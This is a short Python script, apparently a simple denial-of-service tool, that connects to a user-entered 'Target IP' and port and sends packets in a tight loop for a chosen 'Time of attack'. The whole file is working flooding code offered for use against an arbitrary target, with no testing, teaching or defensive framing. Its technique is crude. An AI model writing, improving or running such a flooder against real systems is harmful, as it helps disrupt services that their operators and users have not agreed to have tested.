#========================================================================#
# This program will send tcp packets to a specified ip address and port. #
#========================================================================#

import socket
import time

#============#
# TCP Socket #
#============#
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

user_ip = input("Target IP: ")
user_port = int(input("Enter port: "))

dest_addr = (user_ip, user_port)
sock.connect(dest_addr)

#========================#
#  Set time for attack   #
#========================#
time_limit = int(input("Time of attack (In Seconds): "))
end_time = time.time() + time_limit

#====================================================#
# Sending as many packets as possible in time limit. #
#====================================================#
while time.time() < end_time:
    sock.send(b"PACKET_DATA")

#====================#
# Closing the socket #
#====================#
sock.close()